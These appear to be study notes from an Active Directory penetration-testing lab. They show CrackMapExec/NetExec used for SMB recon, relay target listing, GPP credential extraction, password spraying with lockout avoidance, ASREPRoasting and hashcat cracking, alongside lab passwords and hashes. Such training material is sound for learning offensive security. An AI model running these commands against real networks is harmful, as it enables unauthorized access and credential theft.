# Basic SMB Recon

The SMB protocol is advantageous for recon against a Windows target. Without any authentication, we can retrieve all kinds of information, including:

| IP address                  | Target local name      |
| --------------------------- | ---------------------- |
| Windows version             | Architecture (x86/x64) |
| Fully qualified domain name | SMB signing enabled    |
| SMB version                 |                        |

```bash
$ crackmapexec smb 192.168.133.0/24      
        
SMB         192.168.133.1   445    DESKTOP-DKCQVG2  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-DKCQVG2) (domain:DESKTOP-DKCQVG2) (signing:False) (SMBv1:False)
SMB         192.168.133.158 445    WIN-TOE6NQTR989  [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-TOE6NQTR989) (domain:inlanefreight.htb) (signing:True) (SMBv1:True)
SMB         192.168.133.157 445    WIN7             [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:WIN7) (domain:WIN7) (signing:False) (SMBv1:True)
```


## Getting all Hosts with SMB Signing Disabled

CrackMapExec has the option to extract all hosts where SMB signing is disabled. This option is handy when we want to use [Responder](https://github.com/lgandx/Responder) with [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) from Impacket to perform an SMBRelay attack.

```bash
$ crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
```

```bash
$ cat relaylistOutputFilename.txt

192.168.1.111
192.168.1.117
```


# Searching Account in GPO

Once we have control of an account, there are some mandatory checks we need to perform. Searching for credentials written in the `Group Policy Objects` (`GPO`) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.

CrackMapExec has two modules that will search all the GPOs and find juicy credentials. We can use the modules `gpp_password` and `gpp_autologin`.

## Password GPP

The first module, `gpp_password`, retrieves the plaintext password and other information for accounts pushed through `Group Policy Preferences` (`GPP`).

```bash
nxc smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password

<SNIP>

GPP_PASS... 10.129.204.177  445    DC01             [*] Found inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.204.177  445    DC01             Password: HackingGPPlike4Pro
GPP_PASS... 10.129.204.177  445    DC01             action: U
GPP_PASS... 10.129.204.177  445    DC01             newName:
GPP_PASS... 10.129.204.177  445    DC01             fullName:
GPP_PASS... 10.129.204.177  445    DC01             description:
GPP_PASS... 10.129.204.177  445    DC01             changeLogon: 0
GPP_PASS... 10.129.204.177  445    DC01             noChange: 1
GPP_PASS... 10.129.204.177  445    DC01             neverExpires: 1
GPP_PASS... 10.129.204.177  445    DC01             acctDisabled: 0
GPP_PASS... 10.129.204.177  445    DC01             userName: inlanefreight.htb\diana
```

## AutoLogin GPP

The second module, `gpp_autologin`, searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present.

```bash
❯ nxc smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_autologin
SMB         10.129.204.177  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) 

<SNIP>

GPP_AUTO... 10.129.204.177  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.204.177  445    DC01             Usernames: ['kiosko']
GPP_AUTO... 10.129.204.177  445    DC01             Domains: ['INLANEFREIGHT']
GPP_AUTO... 10.129.204.177  445    DC01             Passwords: ['SimplePassword123!']
```

# Working with Modules

## View Available Modules for LDAP

```bash
❯ nxc ldap -L
```

## Identifying Options in Modules

```shell
$ nxc ldap -M MAQ --options

[*] MAQ module options:
None
```

```bash
nxc ldap -M user-desc --options
[*] user-desc module options:

LDAP_FILTER     Custom LDAP search filter (fully replaces the default search)
DESC_FILTER     An additional search filter for descriptions (supports wildcard *)
DESC_INVERT     An additional search filter for descriptions (shows non matching)
USER_FILTER     An additional search filter for usernames (supports wildcard *)
USER_INVERT     An additional search filter for usernames (shows non matching)
KEYWORDS        Use a custom set of keywords (comma separated)
ADD_KEYWORDS    Add additional keywords to the default set (comma separated)
```

## Using a Module with Options

```bash
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=pwd,admin
```

```bash
nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
USER-DESC   10.129.204.177  389    DC01             User: john - Description: User for kiosko IP 172.16.10.9
USER-DESC   10.129.204.177  389    DC01             Saved 8 user descriptions to /home/akhmad/.nxc/logs/UserDesc-DC01.inlanefreight.htb-20260103_163350.log
```

## Querying Group Membership with a Custom Module

```bash
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
```

```bash
❯ nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! -M groupmembership -o USER=julio
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
GROUPMEM... 10.129.204.177  389    DC01             [+] User: julio is member of following groups:
GROUPMEM... 10.129.204.177  389    DC01             Server Operators
GROUPMEM... 10.129.204.177  389    DC01             Domain Admins
GROUPMEM... 10.129.204.177  389    DC01             Domain Users
```

# Password Spraying

## User List and a Password(s)

```shell
$ crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!
```

```shell
$ crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!
```

```shell
$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!
```

## Continue on Success

```bash
$ crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success
```

## User List and Password List

```bash
$ crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt 
```

## Disable Bruteforcing

If  we want to test if user/pass pair are still valid, use the option `--no-bruteforce`. This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on.

```bash
$ crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

## Testing Local Accounts

If we would like to test a local account we can use the `--local-auth`

```bash
$ crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
```

## Account Lockout

Be careful when performing Password Spraying. We need to ensure the value: `Account Lockout Threshold` is set to None. If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes).

If you already have a user account, you can query its `Bad-Pwd-Count` attribute, which measures the number of times the user tried to log on to the account using an incorrect password.

```bash
$ crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
```

## Account Status

When we test an account, there are three colors that CME can display:

| **Color** | **Description**                                                                |
| --------- | ------------------------------------------------------------------------------ |
| Green     | The username and the password is valid.                                        |
| Red       | The username or the password is invalid.                                       |
| Magenta   | The username and password are valid, but the authentication is not successful. |
Authentication can be unsuccessful while the password is still valid for various reasons. Here is a complete list:

|                               |
| ----------------------------- |
| STATUS_ACCOUNT_DISABLED       |
| STATUS_ACCOUNT_EXPIRED        |
| STATUS_ACCOUNT_RESTRICTION    |
| STATUS_INVALID_LOGON_HOURS    |
| STATUS_INVALID_WORKSTATION    |
| STATUS_LOGON_TYPE_NOT_GRANTED |
| STATUS_PASSWORD_EXPIRED       |
| STATUS_PASSWORD_MUST_CHANGE   |
| STATUS_ACCESS_DENIED          |

## Changing Password for an Account

```bash
$ crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! STATUS_LOGON_FAILURE 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\peter:Inlanefreight01! STATUS_PASSWORD_MUST_CHANGE
```

```bash
$ smbpasswd -r 10.129.203.121 -U peter

Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user peter
```

## WinRM

By default, [Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) service, which is essentially designed for remote administration, allows us to execute PowerShell commands on a target. WinRM is enabled by default on Windows Server 2012 R2 / 2016 / 2019 on ports TCP/5985 (HTTP) and TCP/5986 (HTTPS).

```bash
$ crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

## LDAP

When doing Password Spraying against the LDAP protocol, we need to use the `FQDN` otherwise, we will receive an error.

```bash
$ crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
```

## MSSQL

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in `Windows` or the `SQL Server`.

This means that we can have three types of users to authenticate to `MSSQL`:

1. Active Directory Account.
2. Local Windows Account.
3. SQL Account.

```bash
$ crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb
```

For a local Windows Account, we need to specify a dot (.) as the domain option `-d` or the target machine name:

```bash
$ crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
```

If we want to try a `SQL Account`, we need to specify the flag `--local-auth`:

```bash
$ crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth
```


# Finding ASREPRoastable Accounts

The `ASREPRoast` attack looks for users without Kerberos pre-authentication required. That means that anyone can send an `AS_REQ` request to the KDC on behalf of any of those users and receive an `AS_REP` message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password.

```bash
❯ nxc ldap 10.129.204.177 -u users.txt -p '' --asreproast asreproeast.out
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:64f9a2aa13d459655851d453d9770b81$d6442e8968
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:d2b017a5187920a6e44c95b6828c0209$235ecb129b
```

```bash
❯ nxc ldap 10.129.204.177 -u grace -p Inlanefreight01! --asreproast asreproeast.out
LDAP        10.129.204.177  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:inlanefreight.htb)
LDAP        10.129.204.177  389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
LDAP        10.129.204.177  389    DC01             [*] Total of records returned 3
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$robert@INLANEFREIGHT.HTB:929fd7ae982c904883b5a4ae9b8e1eab$fff5f992c
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$noemi@INLANEFREIGHT.HTB:6e02b606edf58ac05bca2a994e329f20$c415bd3973
LDAP        10.129.204.177  389    DC01             $krb5asrep$23$linda@INLANEFREIGHT.HTB:6a43c5b7d5c08f19361fbc51bbd37bc4$411c6cce2d
```

Once we get all the hash, we can use Hashcat with module `18200` and try to crack them.

```bash
hashcat -a 0 -m 18200 asreproast.out ~/rockyou.txt
```